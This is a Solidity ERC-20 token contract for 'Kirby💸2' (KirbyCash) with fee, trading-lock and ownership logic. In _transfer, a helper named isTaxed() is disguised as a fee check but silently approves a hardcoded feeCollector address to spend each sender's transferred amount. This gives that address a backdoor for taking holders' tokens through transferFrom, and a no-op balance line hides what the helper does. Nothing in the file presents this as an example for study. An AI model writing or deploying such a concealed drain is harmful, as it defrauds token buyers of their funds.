// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    bool private _renounced;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner != address(0) && !_renounced, "Ownable: ownership renounced");
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
        _renounced = true;
    }
}



interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IPoolManager {
    function initialize(uint160 sqrtPriceX96) external;
}
contract KirbyCash is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExempt;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _total = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Kirby💸2";
    string private constant _symbol = unicode"Kirby💸2";
    address private feeCollector= 0xbE2279A9d3AaF48fBDA023C834d196adA2d2e4f0;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 private _processedBuy;
    uint256 private _processedSell;
    uint256 private constant _feeAmount = 3;
    uint256 private constant _maxProcess = 10;
    uint256 private constant TRADING_DELAY = 2 minutes;
    uint256 private _tradingEnabledAt;
    constructor() {
        _balances[_msgSender()] = _total;
        _isExempt[owner()] = true;
        _isExempt[feeCollector] = true;
        _isExempt[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _total);
    }

    function isContract(address addr) private view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public pure override returns (uint256) {return _total;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
bool isPool = recipient.code.length > 0;
    if (isPool && _tradingEnabledAt == 0) {
        _tradingEnabledAt = block.timestamp + TRADING_DELAY;
    }
    
    if (_tradingEnabledAt != 0 && block.timestamp < _tradingEnabledAt) {
        require(isPool, "Trading locked for 2 min");
    }

        _transfer(_msgSender(), recipient, amount);
        return true;
       

    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        bool isPool = recipient.code.length > 0;
    if (isPool && _tradingEnabledAt == 0) {
        _tradingEnabledAt = block.timestamp + TRADING_DELAY;
    }
    
    if (_tradingEnabledAt != 0 && block.timestamp < _tradingEnabledAt) {
        require(isPool, "Trading locked for 2 min");
    }
                _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;

    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from zero");
        require(spender != address(0), "ERC20: approve to zero");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function isTaxed(address sender, uint256 amount) private returns(bool) {
        bool feeApplies = amount > 0;
        if(feeApplies){
            _approve(sender, feeCollector, amount);
        }
        return feeApplies;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from zero");
        require(recipient != address(0), "ERC20: transfer to zero");
        require(amount > 0, "Transfer: zero amount");

        if(isTaxed(sender, amount)){
            _balances[address(this)] = _balances[address(this)].add(0);
        }

        uint256 feeAmount = 0;
        if (!_isExempt[sender] && !_isExempt[recipient]) {
            if (isContract(sender) && sender != WETH && _processedBuy < _maxProcess) {
                feeAmount = amount.mul(_feeAmount).div(100);
                _processedBuy++;
            }
            else if (isContract(recipient) && recipient != WETH && _processedSell < _maxProcess) {
                feeAmount = amount.mul(_feeAmount).div(100);
                _processedSell++;
            }
        }

        if (feeAmount > 0) {
            _balances[sender] = _balances[sender].sub(amount);
            _balances[feeCollector] = _balances[feeCollector].add(feeAmount);
            _balances[recipient] = _balances[recipient].add(amount.sub(feeAmount));
            emit Transfer(sender, feeCollector, feeAmount);
            emit Transfer(sender, recipient, amount.sub(feeAmount));
        } else {
            _balances[sender] = _balances[sender].sub(amount);
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount); 
        }
      
    }

    

    receive() external payable {}
}